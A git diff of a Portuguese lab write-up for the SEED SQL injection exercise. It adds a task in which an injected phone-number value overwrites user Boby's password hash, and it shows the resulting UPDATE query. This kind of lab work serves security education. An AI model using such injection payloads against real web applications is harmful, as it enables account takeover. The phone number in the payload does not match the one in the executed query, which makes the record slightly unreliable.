@@ -2,7 +2,7 @@
 
 ## Setup
 
-Para começar a realizar este lab começamos por adicionar uma nova entrada nos hosts conhecidos pela máquina virtual, <b>www.seed-server.com</b>, <b>sudo nano etc/hosts</b> e adicionando <b>10.9.0.5 www.seed-server.com</b>. Depois, executamos os containers usando <b>dcbuild</b> <b<#docker-compose build</b> e <b>dcup</b> <b<#docker-compose up</b>. Por último executamos <b>mysql -u root -pdees</b> e <b>use sqllab_users</b> para executar como superuser e selecionar o schema.
+Para começar a realizar este lab começamos por adicionar uma nova entrada nos hosts conhecidos pela máquina virtual, <b>www.seed-server.com</b>, <b>sudo nano etc/hosts</b> e adicionando <b>10.9.0.5 www.seed-server.com</b>. Depois, executamos os containers usando <b>dcbuild</b> <b<#docker-compose build</b> e <b>dcup</b> <b< #docker-compose up</b>. Por último executamos <b>mysql -u root -pdees</b> e <b>use sqllab_users</b> para executar como superuser e selecionar o schema.
 
 
 ## Tasks
@@ -109,3 +109,21 @@ Alterando assim o salário do Boby.
 
 #### Task 3.3 - Modify other people’ password
 
+Para mudar a senha de outro usuário, ciframos a nova senha com SHA1. Por exemplo, para a senha <b>teste</b>, o hash é <b>2e6f9b0d5885b6010f9167787445617f553a735f</b>.
+
+```sql
+910123124', password='2e6f9b0d5885b6010f9167787445617f553a735f' WHERE name='Boby'#
+```
+
+Com este input, o servidor executou o seguinte código:
+
+```sql
+UPDATE credential SET
+nickname='$input_nickname',
+email='$input_email',
+address='$input_address',
+Password='$hashed_pwd',
+PhoneNumber='910123125', password='2e6f9b0d5885b6010f9167787445617f553a735f' WHERE name='Boby'# WHERE ID=$id;
+```
+
+E assim conseguimos entrar com sucesso na conta do Boby.
